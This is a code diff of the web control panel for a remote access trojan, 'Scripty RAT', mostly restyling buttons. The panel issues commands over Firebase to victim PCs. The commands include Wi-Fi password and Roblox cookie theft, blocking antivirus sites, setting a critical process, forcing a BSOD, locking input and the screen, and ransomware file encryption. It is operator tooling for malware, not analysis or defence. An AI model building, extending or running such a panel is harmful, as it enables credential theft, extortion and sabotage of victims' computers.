@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Potkan C2 Control</title>
-    <!-- Use Phosphor Icons for professional look -->
+    <title>Scripty RAT | C2</title>
+    <!-- Phosphor Icons -->
     <script src="https://unpkg.com/@phosphor-icons/web"></script>
     <style>
         :root {
@@ -50,9 +50,9 @@
         .top-bar {
             position: fixed;
             top: 0; left: 0; right: 0;
-            background: rgba(15, 23, 42, 0.9);
+            background: rgba(15, 23, 42, 0.95);
             backdrop-filter: blur(10px);
-            padding: 15px 30px;
+            padding: 1px 20px; 
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -104,7 +104,7 @@
 
         /* GRID DASHBOARD */
         .dashboard-grid {
-            display: none; /* Hidden by default */
+            display: none; 
             grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
             gap: 20px;
         }
@@ -131,19 +131,19 @@
         }
         .card-title i { font-size: 1.3rem; }
 
+        /* BUTTON GRID (Uniform 2 Columns) */
         .btn-grid {
             display: grid;
-            grid-template-columns: 1fr 1fr;
+            grid-template-columns: 1fr 1fr; /* ALWAYS 2 equal columns */
             gap: 10px;
         }
         
-        .full-width { grid-column: span 2; }
-
+        /* UNIFORM BUTTON STYLE */
         button {
             border: none;
             border-radius: 8px;
-            padding: 12px;
-            font-size: 0.9rem;
+            padding: 0 10px; /* Horizontal padding only */
+            font-size: 0.85rem;
             font-weight: 600;
             cursor: pointer;
             color: white;
@@ -151,10 +151,20 @@
             align-items: center;
             justify-content: center;
             gap: 8px;
-            transition: background 0.2s;
-            height: 48px; /* Fixed height for consistency */
+            transition: background 0.2s, transform 0.1s;
+            
+            /* FORCED SAME SIZE */
+            width: 100%;
+            height: 50px; /* Fixed Height */
+            
+            /* Text Handling */
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
         }
         
+        button:active { transform: scale(0.98); }
+
         .btn-primary { background: var(--primary); }
         .btn-primary:hover { background: var(--primary-hover); }
 
@@ -169,6 +179,15 @@
 
         .btn-neutral { background: #475569; }
         .btn-neutral:hover { background: #64748b; }
+
+        /* Full width slider container */
+        .slider-container {
+            grid-column: span 2; 
+            padding: 5px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
 
         /* SLIDER */
         input[type=range] {
@@ -222,10 +241,10 @@
 
     <!-- TOP BAR -->
     <div class="top-bar">
-        <h1>POTKAN <span style="font-size:1rem; opacity:0.7; font-weight:400;">C2 PANEL</span></h1>
+        <h1>Scripty RAT <span style="font-size:1rem; opacity:0.7; font-weight:400;">C2 PANEL</span></h1>
         <div style="display:flex; align-items:center; gap:15px;">
             <span id="userDisplay" class="user-info">Authenticating...</span>
-            <button class="logout-btn" onclick="logout()">LOGOUT</button>
+            <button class="logout-btn" style="height:34px; width:auto;">LOGOUT</button>
         </div>
     </div>
 
@@ -245,38 +264,38 @@
         <div id="mainDashboard" class="dashboard-grid">
 
             <!-- 1. POWER -->
-            <div class="card">
+            <div class="card" style="border-top: 3px solid var(--danger);">
                 <div class="card-title"><i class="ph ph-lightning" style="color:var(--warn);"></i> Power Control</div>
                 <div class="btn-grid">
                     <button class="btn-primary" onclick="cmd('lock_pc')"><i class="ph ph-lock"></i> Lock</button>
                     <button class="btn-warn" onclick="cmd('restart_pc')"><i class="ph ph-arrows-clockwise"></i> Restart</button>
-                    <button class="btn-danger full-width" onclick="confirmAction('shutdown_pc')"><i class="ph ph-power"></i> Shutdown</button>
-                    <button class="btn-danger full-width" onclick="confirmAction('bsod')"><i class="ph ph-skull"></i> BSOD</button>
+                    <button class="btn-danger" onclick="confirmAction('shutdown_pc')"><i class="ph ph-power"></i> Shutdown</button>
+                    <button class="btn-danger" onclick="confirmAction('bsod')"><i class="ph ph-skull"></i> BSOD</button>
                     <button class="btn-danger" onclick="toggleInput(true)"><i class="ph ph-keyboard-slash"></i> Block Input</button>
                     <button class="btn-success" onclick="toggleInput(false)"><i class="ph ph-keyboard"></i> Free Input</button>
                 </div>
             </div>
 
-            <!-- 2. SECURITY & NETWORK (NEW) -->
+            <!-- 2. SECURITY & NETWORK -->
             <div class="card" style="border-top: 3px solid var(--danger);">
                 <div class="card-title"><i class="ph ph-shield-warning" style="color:var(--danger);"></i> Security & Net</div>
                 <div class="btn-grid">
-                    <button class="btn-danger full-width" onclick="cmd('block_av_sites')"><i class="ph ph-prohibit"></i> Block AV Sites</button>
-                    <button class="btn-success full-width" onclick="cmd('unblock_av_sites')"><i class="ph ph-check-circle"></i> Unblock AV Sites</button>
+                    <button class="btn-danger" onclick="cmd('block_av_sites')"><i class="ph ph-prohibit"></i> Block AV</button>
+                    <button class="btn-success" onclick="cmd('unblock_av_sites')"><i class="ph ph-check-circle"></i> Unblock AV</button>
                     <button class="btn-danger" onclick="confirmAction('set_critical')"><i class="ph ph-warning"></i> Set Critical</button>
                     <button class="btn-success" onclick="cmd('unset_critical')"><i class="ph ph-shield-check"></i> Unset</button>
-                    <button class="btn-primary full-width" onclick="cmd('check_admin')"><i class="ph ph-user-gear"></i> Check Admin</button>
+                    <button class="btn-primary" onclick="cmd('check_admin')" style="grid-column: span 2"><i class="ph ph-user-gear"></i> Check Admin Status</button>
                 </div>
             </div>
 
             <!-- 3. STEALERS -->
-            <div class="card" style="border-top: 3px solid #a855f7;">
+            <div class="card" style="border-top: 3px solid var(--danger);">
                 <div class="card-title"><i class="ph ph-spy" style="color:#a855f7;"></i> Data Extraction</div>
                 <div class="btn-grid">
-                    <button class="btn-primary full-width" onclick="cmd('wifi_stealer')"><i class="ph ph-wifi-high"></i> Steal Wi-Fi</button>
-                    <button class="btn-warn full-width" onclick="cmd('grab_roblox')"><i class="ph ph-cookie"></i> Roblox Cookie</button>
-                    <button class="btn-neutral full-width" onclick="cmd('hide_taskbar')"><i class="ph ph-eye-slash"></i> Hide Taskbar</button>
-                    <button class="btn-primary full-width" onclick="cmd('show_taskbar')"><i class="ph ph-eye"></i> Show Taskbar</button>
+                    <button class="btn-primary" onclick="cmd('wifi_stealer')"><i class="ph ph-wifi-high"></i> Steal Wi-Fi</button>
+                    <button class="btn-warn" onclick="cmd('grab_roblox')"><i class="ph ph-cookie"></i> Roblox Cookie</button>
+                    <button class="btn-neutral" onclick="cmd('hide_taskbar')"><i class="ph ph-eye-slash"></i> Hide Taskbar</button>
+                    <button class="btn-primary" onclick="cmd('show_taskbar')"><i class="ph ph-eye"></i> Show Taskbar</button>
                 </div>
             </div>
 
@@ -284,19 +303,21 @@
             <div class="card" style="border-top: 3px solid var(--danger);">
                 <div class="card-title"><i class="ph ph-lock-key" style="color:var(--danger);"></i> Ransomware</div>
                 <div class="btn-grid">
-                    <button class="btn-danger full-width" onclick="askForceEncrypt()"><i class="ph ph-lock-simple"></i> Force Encrypt</button>
-                    <button class="btn-success full-width" onclick="askDecrypt()"><i class="ph ph-lock-open"></i> Decrypt Files</button>
+                    <button class="btn-danger" onclick="askForceEncrypt()"><i class="ph ph-lock-simple"></i> Encrypt</button>
+                    <button class="btn-success" onclick="askDecrypt()"><i class="ph ph-lock-open"></i> Decrypt</button>
                 </div>
             </div>
 
             <!-- 5. MEDIA & TROLLING -->
-            <div class="card">
+            <div class="card" style="border-top: 3px solid var(--danger);">
                 <div class="card-title"><i class="ph ph-speaker-high" style="color:var(--success);"></i> Media & Troll</div>
                 <div class="btn-grid">
-                    <button class="btn-primary full-width" onclick="askTTS()"><i class="ph ph-microphone"></i> TTS Speak</button>
-                    <button class="btn-warn full-width" onclick="cmd('jumpscare')"><i class="ph ph-ghost"></i> Jumpscare</button>
-                    <button class="btn-primary full-width" onclick="askMsgBox()"><i class="ph ph-chat-centered-text"></i> Fake Error</button>
-                    <div class="full-width" style="padding:10px 0;">
+                    <button class="btn-primary" onclick="askTTS()"><i class="ph ph-microphone"></i> TTS Speak</button>
+                    <button class="btn-warn" onclick="cmd('jumpscare')"><i class="ph ph-ghost"></i> Jumpscare</button>
+                    <button class="btn-primary" onclick="askMsgBox()"><i class="ph ph-chat-centered-text"></i> Fake Error</button>
+                    <button class="btn-danger" onclick="cmd('block_screen')"><i class="ph ph-monitor-off"></i> Block Screen</button>
+                    
+                    <div class="slider-container">
                         <input type="range" min="0" max="100" value="50" onchange="setVolume(this.value)">
                     </div>
                 </div>
@@ -312,7 +333,7 @@
 
     </div>
 
-    <!-- SCRIPT LOGIC (Firebase same as before) -->
+    <!-- SCRIPT LOGIC -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
@@ -425,7 +446,6 @@
             data.timestamp = Date.now();
             set(ref(db, 'queue/pending'), data);
             
-            // Clean log message
             let msg = data.type.replace('_', ' ').toUpperCase();
             if(data.text) msg += ` "${data.text}"`;
             push(ref(db, 'logs'), { message: `[${window.currentPCName}] ${msg}`, timestamp: Date.now() });
